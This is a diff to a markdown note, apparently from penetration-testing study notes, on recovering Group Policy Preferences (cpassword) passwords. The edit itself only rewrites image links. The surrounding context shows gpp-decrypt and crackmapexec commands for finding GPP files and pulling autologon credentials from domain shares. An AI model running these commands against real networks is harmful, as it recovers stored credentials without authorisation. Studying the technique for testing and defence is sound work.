@@ -12,7 +12,7 @@ The cpassword attribute is encrypted with AES-256, but Microsoft published the A
     - patching this does not remove existing Groups.xml files
     
 [https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN)
-![[../../assets/Group Policy Preferences (GPP) Passwords/image 375.png|image 375.png]]
+![image 375.png](../../assets/Group%20Policy%20Preferences%20(GPP)%20Passwords/image%20375.png)
   
 can use metasploit to search for GPP files as well in the Post Module
 # Decrypting Password with gpp-decrypt
@@ -21,7 +21,7 @@ gpp-decrypt <cpasswd>
 ```
   
 # Locating GPP with CME
-![[../../assets/Group Policy Preferences (GPP) Passwords/image 1 279.png|image 1 279.png]]
+![image 1 279.png](../../assets/Group%20Policy%20Preferences%20(GPP)%20Passwords/image%201%20279.png)
 ```JavaScript
 crackmapexec smb -L | grep gpp
 ```
@@ -32,4 +32,4 @@ Also possible to find Registry.xml file
 ```JavaScript
 crackmapexec smb <IP> -u <user> -p <pass> -M gpp_autologin
 ```
-![[../../assets/Group Policy Preferences (GPP) Passwords/image 2 237.png|image 2 237.png]]
+![image 2 237.png](../../assets/Group%20Policy%20Preferences%20(GPP)%20Passwords/image%202%20237.png)
